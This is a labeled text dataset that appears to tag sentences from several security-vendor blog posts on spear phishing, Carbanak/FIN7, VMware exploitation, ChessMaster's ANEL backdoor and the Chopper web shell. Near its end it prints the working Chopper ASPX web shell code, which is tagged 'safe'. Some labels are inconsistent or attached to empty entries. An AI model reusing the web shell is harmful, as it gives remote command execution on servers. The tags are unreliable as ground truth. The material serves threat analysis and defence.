text: Tags  Mobile | APT & Targeted Attacks | Research
label: safe

text: Spear Phishing is a specific attack technique that has become widely used in the past few years.
label: attack-pattern

text: In our new research blog “FreeMilk: A Highly Targeted Spear Phishing Campaign”, our Unit 42 research team has discovered an attack campaign that takes spear phishing targeting to the next level by hijacking in-progress email conversations.
label: identity

text: While these are not broad attacks, they represent an escalation in attacker spear phishing techniques in a way that makes it even more important than ever to have a prevention framework in place.
label: attack-pattern

text: Standard phishing attacks are broad attacks that use general email messages to carry out the attacks.
label: attack-pattern

text: Standard phishing attacks aren’t personalized: they use very common themes or lures in a generalized way in conjunction with a large enough pool of targets.
label: attack-pattern

text: The idea is that by chance some percentage of the phishing emails will look legitimate enough to the recipient to be successful.
label: attack-pattern

text: Basically, standard phishing attacks rely on the law of averages for its success.
label: attack-pattern

text: As such, it’s a suitable tactic when an attacker cares less about who falls for it than how many fall for it.
label: safe

text: A good example of a generalized phishing campaign is the Blank Slate Campaign we wrote about in March 2017.
label: campaign

text: This attack campaign was so generalized that the attackers didn’t even bother with any theme or lure: they simply sent blank messages with malicious attachments for the recipient to open.
label: safe

text: Spear phishing is a more refined and focused version of phishing.
label: attack-pattern

text: Instead of using generalized themes or lures, spear phishing uses themes or lures that are in some way relevant or appropriate for the target recipient.
label: attack-pattern

text: For example, a spear phishing attack could use email messages about military exercises sent to military or government targets like we saw with our recent research into CMSTAR Trojan attacks.
label: attack-pattern

text: Because the malicious email has a context for the target, he or she is more likely to trust it and open the email message and any attachments.
label: safe

text: Spear phishing focuses on the quality of the theme and lure where standard phishing focuses on quantity.
label: attack-pattern

text: Spear phishing is a suitable tactic when an attacker cares about who falls for it.
label: attack-pattern

text: Where a phishing attack campaign may send malicious emails out to thousands or tens of thousands of targets, a spear phishing campaign my send out just one malicious email to one target.
label: attack-pattern

text: Sometimes, when that target is a high-value target this attack can also be referred to as ‘Whaling”.  In our new research, our Unit 42 research team has found an attack that takes the refining of spear phishing one step further.
label: identity

text: Rather than simply using a theme or lure that is relevant to the target, the attackers behind these attacks use an email conversation that’s in progress to carry out their attack.
label: safe

text: You can see an image of how this works below in Figure 1.  Figure 1 Conversation Hijacking to Deliver Malware  How this works is that two users, Alice (A) and Bob (B) are carrying on an email conversation.
label: safe

text: A shown in the top figure, an attacker, Charlie (C), carries out an attack that enables him to gain complete control of Alice’s email account, most likely through some form of credential theft.
label: safe

text: Once Charlie has access to Alice’s email account, he then finds email conversations between Alice and Bob, his ultimate target.
label: safe

text: When he finds one that is still in progress, he crafts a malicious attack email that seems to be relevant to the ongoing email conversation and sends it to Bob as shown in the bottom figure.
label: safe

text: If Charlie was successful in crafting the attack email to seem legitimate enough, Bob will open the email and any attachments and the attack will succeed.  Unlike phishing or even general spear phishing, this is a highly sophisticated, labor intensive, focused attack.
label: attack-pattern

text: Carrying out a successful conversation hijacking spear phishing attack requires knowing someone that the ultimate target is communicating with, compromising that person’s account, identifying an ongoing email conversation with the ultimate target, crafting an email to appear part of that ongoing email conversation and finally sending it.
label: attack-pattern

text: Even then there’s no guarantee of success since the target may somehow recognize the attack or have sufficient prevention controls in place to prevent the attack from succeeding.
label: safe

text: Given all those points, this isn’t an attack that many of us need to worry about.
label: safe

text: But those out there who are in positions that might make them a high value target do need to be concerned about this.
label: safe

text: Whether you’re on the board of directors for an organization, a CEO/CFO/CSO, entrusted with important military or political information, are a journalist, or an activist/dissident, this is a kind of attack that you could face.
label: safe

text: And like with all targeted attacks, you don’t have to be the ultimate target of the attack campaign to be a target: this is a tactic that can be used as part of a broader attack campaign.
label: safe

text: For example, if you are the executive assistant for a CEO, you could be the target of an attack like this (“Bob” in our scenario above) so that you in turn are used to carry out an attack (“Alice” in our scenario above) against your CEO (who then becomes “Bob” in our scenario above).  Because of the nature of the attack, unless you verify each and every email you receive, it’s unlikely that you’ll necessarily be able to spot and thwart an attack.
label: safe

text: In this case, your best means of protection lies in prevention.
label: safe

text: And prevention here is really focused on two things.
label: safe

text: First, keeping your systems and devices fully up-to-date with the latest software and security updates.
label: safe

text: The specific attack our Unit 42 research team has seen using this technique relied on an attack against a vulnerability in Microsoft Office for which a patch is available.
label: identity

text: If an attacker tried to carry this attack out against a target that was patched for this vulnerability, it would fail.
label: safe

text: Second, using security on your systems, devices and networks that provides multiple layers of protection can help prevent attacks.  Conversation hijacking spear phishing isn’t a threat everyone faces, but for those who do it represents a significant escalation in terms of sophistication and social engineering of spear phishing attacks.
label: attack-pattern

text: It also takes spear phishing attacks to a level that makes it nearly impossible to distinguish an attack email from a legitimate email.
label: attack-pattern

text: And so technological prevention controls (patching, robust security) are even more for effective prevention.
label: safe

text: Constant monitoring of threat groups is one of the ways that security researchers and law enforcement agencies are able defend systems against cybercrime.
label: safe

text: Among these cybercriminals are financially motivated threat groups Carbanak and FIN7.
label: threat-actor

text: Although both names have at times been used to refer to the same group, organizations such as MITRE identifies them as two separate entities that wield the Carbanak backdoor in their attacks.
label: identity

text: However, the groups use not just the Carbanak backdoor but also other types of malware such as Pillowmint, a point-of-sale malware, and Tirion, which is said to be geared to replace Carbanak.
label: malware

text: MITRE also identifies different main targets for each group: While Carbanak focuses on banking institutions, FIN7 targets food, hospitality, and retail establishments.
label: threat-actor

text: This week, the results of this year's round of the MITRE Engenuity ATT&CK Evaluations were released, which focused on Carbanak+FIN7.
label: identity

text: We also separately discussed how Trend Micro solutions deal with these threats.
label: identity

text: For more background on what happens in attacks launched by Carbanak and FIN7, we pieced together information from our studies of these groups as well as information from ATT&CK tactics and techniques (a total of 65 techniques across 11 tactics) identified by MITRE to be related to these threat groups.
label: threat-actor

text: What happens in Carbanak and FIN7 attacks?
label: threat-actor

text: In our analysis of a related past campaign, we observed that attackers enter the system through spear phishing.
label: attack-pattern

text: After gaining a foothold in the system, the dynamic data exchange (DDE) feature in Windows and legitimate cloud-based services will then be abused to deliver the malware or to establish command-and-control (C&C) communication.
label: SOFTWARE

text: After this, the Carbanak backdoor can then be used to log keystrokes and capture screenshots, steal and delete cookies, inject malicious code on sites, and monitor various traffic.
label: malware

text: For lateral movement, the malware abuses remote and system administration tools.
label: attack-pattern

text: To be more specific in terms of ATT&CK® techniques, Carbanak and FIN7 share a notable number of similarities.
label: threat-actor

text: However, some techniques are only used by one of them, as we discuss in the subsequent sections.
label: safe

text: Figure 1. ATT&CK® tactics shared between Carbanak and FIN7      The following are the tactics and techniques that are employed by Carbanak and FIN7, as shared by MITRE.
label: threat-actor

text: Initial Access
label: safe

text: Both groups use spear-phishing campaigns with attachments that are embedded with exploits as an entry point to the target system.
label: attack-pattern

text: Execution
label: safe

text: Successfully entering the system leads to the next step: executing the attack.
label: safe

text: For code and behavior execution, both groups use a variety of techniques through native API, PowerShell, service execution, user execution, Windows Component Object Model (COM) and Distributed COM, and Windows Management Instrumentation (WMI).
label: tools

text: Carbanak also abuses command-line interface and DDE client-server protocol.
label: threat-actor

text: On the other hand, FIN7 takes advantage of Mshta, a utility that can execute VBScript, and scheduled tasks to run malicious code on user systems.
label: threat-actor

text: Persistence
label: safe

text: Once the malicious behavior is executed, the attackers will attempt to keep their presence in a system.
label: safe

text: To maintain persistence, the groups create new services.
label: safe

text: They also add programs to a startup folder that can be referenced with a registry run key.
label: safe

text: We detected a variant of the Carbanak malware that adds registry entries and keys as an autostart technique.
label: malware

text: Credentials of existing valid accounts were also abused.
label: safe

text: In the case of FIN7, the use of application shimming databases (which can allow developers to apply fixes to applications without rewriting code) and hooking processes that allow the modification of program behaviors are some of the techniques that can be applied.
label: threat-actor

text: The former has been utilized in a campaign involving the Pillowmint malware.
label: malware

text: Privilege Escalation
label: attack-pattern

text: Some functions that are needed for the attack require admin privileges.
label: safe

text: To elevate privileges, the groups bypass Windows User Account Control (UAC) mechanisms, new services, and valid accounts to elevate process privileges.
label: attack-pattern

text: For the same purpose, on Linux systems, Carbanak attacks can use sudo, a program that permits users to execute the programs of a superuser.
label: threat-actor

text: FIN7 attacks can and inject code into processes and hijack the search order used to load DLL files.
label: threat-actor

text: Defense Evasion
label: safe

text: After a series of malicious behavior, attackers need to remain stealthy and undetected by using security solutions that can remove threats out of the system.
label: safe

text: For defense evasion, both groups create or acquire tools for code signing the malware, or deobfuscate or decode files or information by using malware functions or utilities in the system.
label: safe

text: Both groups also employ masquerading to make features appear benign to security solutions, files or information obfuscation to make these files and information difficult to discover, software packing to conceal code, and process injection to evade process-based defense.
label: attack-pattern

text: Carbanak also performs techniques for disabling security tools, deleting files that are left in malicious activity, and modifying registry to hide configuration information.
label: attack-pattern

text: FIN7 utilizes guardrails to restrict execution and abused utilities that allow indirect command execution that can go past security restrictions.
label: attack-pattern

text: The group also evades virtualization and sandboxes and injects malicious code into hollowed processes to dodge process-based defenses.
label: attack-pattern

text: Credential Access
label: safe

text: Some portions of the system are protected by credentials.
label: safe

text: To steal these, both groups employed credential dumping and input capture.
label: attack-pattern

text: The former involves credentials that are usually in the form of hash or clear text, while the latter involves API or web portals.
label: safe

text: Carbanak also performs brute force tactics or takes advantage of credentials that are saved in web browsers.
label: attack-pattern

text: On the other hand, FIN7 performs hooking.
label: attack-pattern

text: Discovery
label: safe

text: For the discovery phase, the Carbanak and FIN7 campaigns gain more knowledge about the system by gathering listings of various information: open application windows, running processes, IP addresses and other network identifiers in remote systems, detailed hardware and system information, system network configuration and settings, and system owners and users.
label: threat-actor

text: Carbanak also collects information on accounts, files and directories, group permissions, and registries.
label: threat-actor

text: FIN7 gathers information on network shares.
label: threat-actor

text: The gathered information can aid in the next step: lateral movement.
label: attack-pattern

text: Lateral Movement
label: attack-pattern

text: The groups move through the network and identify key assets and data by logging in via RDP, copying files to upload adversary tools through remote file copy, and abusing Window admin shares.
label: attack-pattern

text: In Carbanak attacks, the groups’ attacks can involve logging into services that accept remote connections and using stolen password hashes through the “pass the hash” method.
label: attack-pattern

text: Collection
label: safe

text: After moving through the network and identifying assets to target, the next step would be to gather key data.
label: safe

text: At the collection phase, Carbanak and FIN7 campaigns harvest data from local system sources and through input and screen capture (as performed in a related campaign using the Tirion malware).
label: attack-pattern

text: FIN7 attacks can stage collected data in a particular location in preparation for exfiltration.
label: threat-actor

text: Command and Control
label: safe

text: In both Carbanak and FIN7 attacks, communication with users’ compromised systems is done through bypassing firewalls or network detection systems via commonly used ports, using connection proxies to avoid direct connections to the threat group’s infrastructure, employing the command-and-control channel to remotely copy files from an external system, blending in with existing network traffic by using standard application layer protocol, and taking advantage of standard cryptographic protocol to disguise command-and-control traffic.
label: threat-actor

text: Carbanak campaigns can also use legitimate programs and remote access software for command and control.
label: threat-actor

text: They also employ standard non-application layer protocols for communication.
label: safe

text: Exfiltration
label: safe

text: In the final phase of the attack, the groups exfiltrate the stolen data into the normal communications channel via command-and-control channels.
label: safe

text: For FIN7 attack routines, data can be compressed and/or encrypted before being exfiltrated.
label: threat-actor

text: ATT&CK® tactics and techniques for Linux were also shared by MITRE.
label: identity

text: Continuous vigilance against threat groups is an important aspect of keeping up with — if not being one step ahead of — threats.
label: safe

text: Solutions such as Trend Micro Vision One™️ provide visibility, correlated detection, and behavior monitoring across multiple layers: email, endpoints, servers, cloud workloads.
label: SOFTWARE

text: Tags  Endpoints | APT & Targeted Attacks | Research | Articles, News, Reports
label: safe

text: On April 6, 2022, VMware published a security advisory mentioning eight vulnerabilities, including CVE-2022-22954 and CVE-2022-22960 impacting their products VMware Workspace ONE Access, Identity Manager and vRealize Automation.
label: vulnerability

text: On April 13, they updated their advisory with information that CVE-2022-22954 is being exploited in the wild.
label: vulnerability

text: Multiple writeups detailing exploitation scenarios for the aforementioned two vulnerabilities were published in the last week of April, finally followed by a CISA Alert on May 18.
label: TIME

text: The CISA Alert also calls out CVE-2022-22972 and CVE-2022-22973 – published on the same day and affecting the same products – as being highly likely to be exploited.
label: identity

text: Unit 42 has observed numerous instances of CVE-2022-22954 being exploited in the wild.
label: identity

text: In this blog post, we share context around this observed activity, along with how the Palo Alto Networks product suite can be leveraged to protect against it.
label: identity

text: Timeline for VMware Vulnerabilities CVE-2022-22954 in the Wild Direct Downloads Mirai/Gafgyt Dropper Scripts or Variants Webshells Perl Shellbot Base64 Injections SSH Key Targeting CVE-2022-22960 in the Wild Conclusion Indicators of Compromise
label: vulnerability

text: Proofs of concept available on GitHub.
label: SOFTWARE

text: This is also the earliest date at which Unit 42 observed exploitation attempts and scanning activity.  2022-04-13: VMware advisory updated with knowledge of active exploitation of CVE-2022-22954 in the wild.
label: TIME

text: Publication of VMware advisory VMSA-2022-0014 regarding CVE-2022-22972, CVE-2022-22973.
label: vulnerability

text: Publication of CISA Alert.
label: identity

text: As of this writing, no proofs of concept for exploitation of CVE-22972 or CVE-2022-22973 are known.
label: vulnerability

text: This post will be updated with new findings as they are discovered.
label: safe

text: CVE-2022-22954, a remote code execution (RCE) vulnerability due to server-side template injection in VMware Workspace ONE Access and Identity Manager, is trivial to exploit with a single HTTP request to a vulnerable device.
label: attack-pattern

text: The list below details the exploits Unit 42 observed targeting this vulnerability that we deemed worth highlighting.
label: identity

text: The injected commands worth mentioning that intended to further download payloads to a vulnerable machine can be categorized into the following broad categories:  We observed several instances of CVE-2022-22954 being exploited to drop variants of the Mirai malware.
label: vulnerability

text: In most cases, the exploit was only used to drop the payload, however the payloads themself did not contain CVE-2022-22954 exploits for further propagation.
label: vulnerability

text: Instead, they were either non-specific Mirai variants or contained previously known exploits such as CVE-2017-17215.
label: malware

text: The exception to this is Enemybot, a currently prevalent botnet built with bits of code from both Gafgyt and Mirai source code.
label: malware

text: The exploits involving Enemybot eventually download Enemybot samples that themselves embed CVE-2022-22954 exploits for further exploitation and propagation.
label: malware

text: We observed the vulnerability exploited to download webshells, including:  Certain injected commands result in the download of obfuscated Perl scripts.
label: attack-pattern

text: Deobfuscating these scripts reveals they are versions of the known bot family “Stealth Shellbot” that reaches out to an IRC server to listen for commands to perform.
label: malware

text: It has the ability to further make HTTP requests based on commands received.
label: safe

text: This would mean infected machines could then be directed to further perform scanning and exploitation activity, in addition to directly executing shell commands received from the command and control (C2) server on the target machine.
label: safe

text: A complete list of indicators of compromise (IoCs) can be found at the end of this post.
label: safe

text: This last command downloads a shell script that ultimately downloads and executes an XMRig coinminer.
label: malware

text: We also observed some instances of injected payloads that were either trying to read authorized keys on vulnerable machines or were writing into the authorized_keys file to add to the machine’s list of accepted keys.
label: safe

text: Following is an example of such an attempt.
label: safe

text: CVE-2022-22960 is a privilege escalation vulnerability in VMware Workspace ONE Access, Identity Manager and vRealize Automation instances, due to improper permissions in support scripts.
label: attack-pattern

text: The vulnerability can be leveraged to run commands as a root user on a vulnerable instance.
label: safe

text: More specifically, this flaw exists since the default user for these VMware products, horizon, has access to several sudo commands, some of which involve paths that can be overwritten as well.
label: identity

text: Attackers can, therefore, leverage CVE-2022-22954 to remotely execute commands to overwrite specific paths.
label: attack-pattern

text: If successful, CVE-2022-22960 can then be leveraged to execute these overwritten paths with root permissions using the sudo command.
label: vulnerability

text: Our research so far has shown one publicly known sample demonstrating exploitation of CVE-2022-22960 by overwriting the /usr/local/horizon/scripts/publishCaCert.hzn file.
label: vulnerability

text: The content of this exploit file can be observed below.
label: safe

text: Another proof of concept code sample is additionally available targeting the following 2 filepaths: /opt/vmware/certproxy/bin/certproxyService.sh /usr/local/horizon/scripts/diagnostic/getPasswordExpiry.hzn
label: FILEPATH

text: Palo Alto Networks is still actively investigating a number of the aforementioned vulnerabilities, many of which do not have publicly available exploit code.
label: identity

text: Presently, customers may leverage the following to block or detect the threats communicated throughout this publication:
label: safe

text: Palo Alto Networks Next Generation Firewall Threat Prevention blocks CVE-2022-22954 exploits with Signature 92483.
label: SOFTWARE

text: Cortex Xpanse was able to identify ~800 instances of VMware Workspace ONE Access connected to the public internet, and can be leveraged to enumerate potentially vulnerable instances within customer networks.
label: SOFTWARE

text: WildFire and Cortex XDR categorize all samples of supported file types as malware.
label: SOFTWARE

text: If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:  As further information or detections are put into place, Palo Alto Networks will update this publication accordingly.
label: identity

text: Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members.
label: identity

text: CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
label: identity

text: Trend Micro discovered the ChessMaster campaign back in July 2017 as part of our monitoring efforts to protect our customers.
label: identity

text: At the time, we found ChessMaster targeting different sectors from the academe to media and government agencies in Japan.
label: campaign

text: The threat group used a variety of attack tools and techniques to spy on their target organizations.
label: safe

text: Back then, we noted that ChessMaster's sophisticated nature implied that the campaign could evolve, before finding changes in the tools and tactics used in the campaign a few months later.
label: campaign

text: While the original campaign was comprehensive and used remote access Trojans (RATs) such as ChChes and RedLeaves, this new campaign used a new backdoor (Detected by Trend Micro as BKDR_ANEL.ZKEI) that leverages the CVE-2017-8759 vulnerability for its cyberespionage activities.
label: malware

text: In this blog post, we analyze ChessMaster's current status, including the updated tools in its arsenal — with a particular focus on the evolution of ANEL and how it is used in the campaign.
label: malware

text: July ChessMaster Campaign November ChessMaster Campaign Current ChessMaster Campaign
label: campaign

text: Point of Entry  Spear-phishing emails containing decoy documents Malicious shortcut (LNK) files and PowerShell Self-extracting archive (SFX) Runtime packers    Spear-phishing emails containing decoy documents exploiting CVE-2017-8759    Spear-phishing emails containing decoy documents exploiting  CVE-2017-11882, DDEAUTO, Microsoft Office Frameset and Link auto update   Notable Tools  Hacking Tools Second-stage payloads    Koadic Hacking Tools Second-stage payloads    Koadic Hacking Tools Second-stage payloads   Backdoor  ChChes    ANEL    ANEL     Technical Analysis  Figure 1.
label: attack-pattern

text: Infection Chain for the current ChessMaster campaign
label: malware

text: ChessMaster’s current iteration starts off with the familiar phishing attacks seen in the earlier campaigns that involved the use of an email with an attached malicious document using the doc, docx, rtf, csv and msg formats.
label: malware

text: The email title and attached file name were written in Japanese and contain general business, political, and economy-themed phrases such as  世界経済(World economy) 経済政策(economic policy) 予算概算要求(budget estimation request) 日米対話(Japan-US dialogue) 安倍再任(re-appointment of Prime Minister Abe) 連絡網(contact network) 職員採用案(staff recruitment plan) 会議(meeting)  However, there is a change in the exploit document.
label: safe

text: When we tracked ChessMaster back in November, we noted that it exploited the SOAP WSDL parser vulnerability CVE-2017-8759 (patched in September 2017) within the Microsoft .NET framework to download additional malware.
label: malware

text: While ChessMaster still uses the previous exploit, it also added more methods to its arsenal: one exploits another vulnerability, CVE-2017-11882 (patched in November 2017), which was also exploited to deliver illegal versions of the Loki infostealer.
label: malware

text: Figure 2. Exploitation of CVE-2017-11882
label: vulnerability

text: It also abuses three legitimate MS Office functions:
label: SOFTWARE

text: Function Purpose Affected MS Office Formats we found in the wild Automatic Dynamic Data Exchange (DDEAUTO) A legitimate Microsoft Office function used in an Office file to retrieve data from another Office file
label: SOFTWARE

text: .doc .rtf .msg   Link
label: safe

text: Auto Update
label: safe

text: An Office function used for automatic and user-free updates for embedded links upon opening.
label: SOFTWARE

text: .csv   Microsoft Word's "Frames/Frameset" A feature that allows HTML or Text pages to be loaded in a frame within Microsoft Word.
label: SOFTWARE

text: .docx      Figure 3. Exploitation of DDEAUTO  Figure 4.
label: safe

text: Abusing Microsoft Word's "Frames/Frameset"
label: SOFTWARE

text: Figure 5. Exploitation of Link Auto Update
label: safe

text: ChessMaster can utilize any of these methods to download the next malware in the chain, the open source post-exploitation tool known as “Koadic,” which the previous campaign also used.
label: malware

text: This tool is responsible for stealing information — specifically the environment information — within the target system.
label: safe

text: Koadic executes the following command:  %comspec% /q /c <cmd> 1> <Output> 2>&1
label: malware

text: The commands and output of Koadic will change according to the ANEL version used in the attack.
label: malware

text: The table below lists examples of the commands and outputs for ANEL versions 5.1.1 rc and 5.1.2 rc1.
label: malware

text: Note that if ANEL 5.1.2 rc1 was downloaded, the attacker would use HTTPS to avoid the downloaded data being captured as clear text.
label: malware

text: Koadic commands and output when ANEL 5.1.1 rc is used  Figure 7.
label: malware

label: malware

label: malware

text: If Koadic finds that the system is conducive to the attacker’s interests, it downloads a base64-encrypted version of the ANEL malware from the Command-and-Control (C&C) server and executes it.  Encrypted ANEL is decrypted using the “certutil -docode” command.
label: malware

text: When ANEL executes, a decrypted DLL file with the filename “lena_http_dll.dll” is expanded in memory.
label: malware

text: This file contains one export function — either “crt_main” or “lena_main”  Figure 9.
label: safe

text: Base64 encoded ANEL downloaded by Koadic ANEL will send the infected environment’s information to the C&C server.
label: malware

text: When sending the information, ANEL encrypts the data using blowfish, XOR, and Base64-based encryption methods.
label: malware

text: The format ANEL uses to send data is similar to ChChes, but ANEL's encryption method is easier to use.
label: malware

text: Figure 10.
label: safe

text: Encryption key using blowfish
label: safe

text: We initially discovered the malware known as ANEL back in September 2017.
label: malware

text: At that time, ChessMaster was using ANEL as a backdoor into the target system then injects code into svchost.exe, which then decrypts and activates the embedded backdoor.
label: malware

text: This initial version of ANEL had a hardcoded version labeled “5.0.0 beta1” that contained incomplete code.
label: malware

text: We noted that this might signify the release of a future variant.
label: safe

text: Instead of just one new variant, we discovered four different versions of ANEL:  5.0.0 beta1 5.1.1 rc 5.1.2 rc1 5.2.0 rev1  The different versions contain changes in the ANEL loader and the main ANEL DLL.
label: malware

text: The figure below shows a summary of the changes between each version:  Figure 11.
label: safe

text: Summary of the changes between each version of ANEL
label: malware

text: Differences with regards to Backdoor commands:  CMD ID 5.0.0 beta1/5.1.1 rc/5.1.2 rc1 5.2.0 rev1 0x97A168D9697D40DD Save File 0x7CF812296CCC68D5 Upload File 0x652CB1CEFF1C0A00 NA Load New PE file 0x27595F1F74B55278 Save File and Execute If no match above Execute Command or File   The differences shown in the table above are subtle but present.
label: safe

text: For example, the initial ANEL version, “5.0.0 beta1,” uses a different C&C server compared to the other versions.
label: malware

text: Once ANEL evolved to “5.1.1 rc,” it changed its file type to an executable, while also changing the C&C server.
label: malware

text: The third version we found (5.1.2 rc1) reverts to a DLL file type but retains the C&C server.
label: safe

text: The fourth version of ANEL (5.2.0 rev1) changes both the export function in the expanded main ANEL DLL and uses a different C&C server.
label: malware

text: Overall, we can see subtle changes, which indicate that the threat actors behind ANEL are making incremental improvements to the malware to refine it.
label: malware

text: Backdoor function differences between ANEL 5.0.0 beta1/5.1.1 rc/5.1.2 rc1 (left) and ANEL 5.2.0 rev1 (right)
label: malware

text: Once ANEL enters the user’s system, it will download various tools that could be used for malicious purposes, including password retrieval tools as well as malicious mail services and accessibility tools that will allow it to gather information about the system.
label: malware

text: These include Getpass.exe and Mail.exe, which are password and information stealers.
label: FILEPATH

text: It also downloads the following:  Accevent.exe <-> Microsoft Accessible Event Watcher 7.2.0.0 event.dll <-> the loader of ssssss.ddd, (Detected as TROJ_ANELLDR) ssssss.ddd (lena_http.bin) <-> encrypted BKDR_ANEL (Detected as BKDR_ANELENC)
label: FILEPATH

text: These three files work together using a common technique call DLL Side-Loading or DLL Hijacking.
label: attack-pattern

text: In this scenario, accevent.exe is the primary executable, which is usually legitimate.
label: FILEPATH

text: After the execution of accevent.exe, it loads event.dll, which will be placed in the same folder (so it takes loading priority), after which event.dll decrypts and loads the encrypted backdoor ssssss.ddd, which is BKDR_ANEL.
label: FILEPATH

text: When we analyzed ANEL 5.1.1 rc, encrypted ANEL 5.1.2 rc1 was downloaded and executed.
label: malware

text: Short-term mitigation
label: safe

text: When the user opens the document DDEAUTO or Link Auto Update, Office will display a message.
label: SOFTWARE

text: If the user clicks on the “No” button, malicious activity will not initiate.
label: safe

text: Figure 13: Popup message when users open the document that abuses DDEAUTO  Figure 14.
label: safe

text: Popup message when the user opens the document that abuses Link Auto Update Koadic sends its own JavaScript code as plain text.
label: malware

text: At first glance, it seems ChessMaster’s evolution over the past few months involves subtle changes.
label: malware

text: However, the constant addition and changing of features and attack vectors indicate that the attackers behind the campaign are unlikely to stop and are constantly looking to evolve their tools and tactics.
label: safe

text: Organizations can implement various techniques and best practices to defend against targeted attacks, such as regular patching to prevent vulnerability exploitation and using tools that provide protection across different network levels.
label: safe

text: Solutions that feature behavior monitoring, application control, email gateway monitoring, and intrusion/detection systems can help with this.
label: safe

text: Given how cybercriminal tools, tactics and procedures are evolving, organizations will have to go beyond their typical day-to-day security requirements and find a way to preempt attacks.
label: safe

text: Thus, there is a pressing need to detect and address threats via a proactive incident response strategy.
label: safe

text: Essentially, this involves creating a remediation plan for effectively combating the threat and using round-the-clock intrusion detection and threat analysis to prevent attacks from entering the system.
label: safe

text: A proactive strategy can be much more effective for targeted attacks, as these kinds of attacks are often designed to be elusive and difficult to detect, thus the need to scope them out.
label: safe

text: A comprehensive security strategy that involves proactive incident response will need the input of both decision makers and tech-savvy personnel, as they will need to be on the same page for it to be effective.
label: safe

text: In addition to implementing both mitigation techniques and proactive strategies, organizations can also strengthen their security by employing solutions such Trend Micro™ Deep Security™ and TippingPoint, which protects endpoints from threats that abuse vulnerabilities.
label: identity

text: In addition, comprehensive security solutions can be used to protect organizations from attacks.
label: safe

text: These include Trend Micro endpoint solutions such as Trend Micro™ Smart Protection Suites and Worry-Free™ Business Security, which can protect users and businesses from these threats by detecting malicious files, well as blocking all related malicious URLs.
label: identity

text: Trend Micro Deep Discovery™ can protect enterprises by detecting malicious attachment and URLs.
label: SOFTWARE

text: Trend Micro OfficeScan™ with XGen™ endpoint security
label: SOFTWARE

text: infuses high-fidelity machine learning with other detection technologies and global threat intelligence for comprehensive protection against all kinds of threats.
label: safe

text: A more detailed analysis of the Command-and-Control communication flow of ANEL can be found in this technical brief.
label: malware

label: SHA2

text: Last June 9, 2021, the Cybersecurity and Infrastructure Security Agency (CISA) released the Rising Ransomware Threat to OT Assets, which addresses the recent rise in ransomware attacks targeting operational assets (OT) and control systems.
label: TIME

text: The guidance provides steps to prepare for, mitigate against, and respond to attacks.
label: safe

text: It also identifies how dependencies between an enterprise's IT and OT systems can give attackers a path.
label: safe

text: Lastly, the document thoroughly explains how to decrease the risk of severe business degradation if affected by a ransomware attack.
label: safe

text: To prepare for ransomware attacks, CISA recommends enterprises determine their critical operational processes' reliance on key IT infrastructure and identify a resilience plan for when access control is lost.
label: identity

text: They should also exercise an incident response plan and Implement regular data backup procedures on both IT and OT networks.
label: safe

text: For mitigating and responding to an attack, organizations must practice good cyber hygiene by updating software, implementing an allow listing, and enabling strong spam filters.
label: safe

text: Organizations must also identify which systems were affected and immediately isolate them and triage the impacted systems for restorations and recovery.
label: safe

text: They must also confer with teams to develop and document what has occurred.
label: safe

text: According to the agency, critical infrastructure owners and operators should also adopt an "heightened state of awareness".
label: safe

text: CISA also encourages them to identify critical processes that must not be interrupted to provide essential services, develop and regularly test workarounds and/or manual controls that ensure critical processes and industrial control system (ICS) network supporting them.
label: identity

text: CISA recommends critical infrastructure owners to implement robust network segmentation between IT and OT networks and make sure backup procedures are executed and tested regularly.
label: identity

text: Lastly, backups should be isolated from network connections.
label: safe

text: The fact sheet comes after numerous ransomware attacks on key critical infrastructures in the US and abroad, including the attack on Colonial Pipeline by DarkSide.
label: location

text: In 2019, Trend Micro conducted research analyzing cyberattacks by building and using a factory honeypot, mimicking a factory environment.
label: TIME

text: The study, Fake Company, Real Threats, revealed that over 20 attacks were observed during 240 days- six of which affected factory productivity.
label: safe

text: This shows how vulnerable smart factories are when it comes to various cyberattacks, such as ransomware.
label: safe

text: Ransomware incidents are federal crimes, according to the agency.
label: safe

text: Enterprises, especially critical infrastructure establishments, must report the attack to law enforcement to help bring the attackers to justice.
label: safe

text: Moreover, decision-makers and stakeholders should have a better understanding of cybersecurity and its role in securing their operations and the safety of consumers.
label: safe

text: To learn more about how to protect smart factories and their critical operations, read Trend Micro's expertly crafted best practices and solutions:  Smart Factory Security Solutions Trend Micro Best Practices for Securing Smart Factories         Tags  Latest News | ICS OT | APT & Targeted Attacks | Ransomware | Articles, News, Reports | Cyber Threats
label: identity

text: Web shells, in their simplicity and straightforwardness, are highly potent when it comes to compromising systems and environments.
label: safe

text: These malicious code pieces can be written in ASP, PHP, and JSP, or any script that can execute a system command with a parameter that can pass through the web.
label: safe

text: Web shells can be embedded on web servers and can be used by malicious actors to launch arbitrary code.
label: attack-pattern

text: In as little as 15 bytes, web shells can enable remote administration of an infected machine or system.
label: attack-pattern

text: Threats such as this can be difficult to detect even with multiple security layers — especially if they are not consolidated.   In this blog, we will dissect a targeted attack that made use of the Chopper ASPX web shell (detected by Trend Micro as Backdoor.ASP.WEBSHELL.UWMANA).  Technical Analysis
label: malware

text: Initial access
label: safe

text: Based on our investigation, the Chopper web shell is dropped via a system token, potentially via a Microsoft Exchange Server vulnerability.
label: vulnerability

text: One notable vulnerability in the Microsoft Exchange Server is CVE-2020-0688, a remote code execution bug.
label: SOFTWARE

text: Microsoft issued a patch for this vulnerability in  February 2020.
label: TIME

text: However, the malicious actors behind this attack drop the Chopper web shell in the web directory folder to establish persistence.
label: malware

text: Through the ASPX file, malicious actors can establish a foothold in affected public-facing Outlook Web App (OWA) servers and send remote commands through them.
label: SOFTWARE

text: Outlook Web App (Web Directory)  -  D:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\15.1.2044\scripts\premium\premium.aspx
label: SOFTWARE

text: The attack features the following script:
label: safe

text: <%@ Page Language="Jscript" Debug=true%>
label: safe

text: var
label: safe

text: System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5Gb3JtWyJjb21tYW5kIl0="))
label: safe

text: var b=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("dW5zYWZl")); var c=eval(a,b); eval(c,b); %>
label: safe

text: When simplified, the malicious script looks like this, with the eval being the executor and the Request.Form acquiring the parameter to be executed:
label: safe

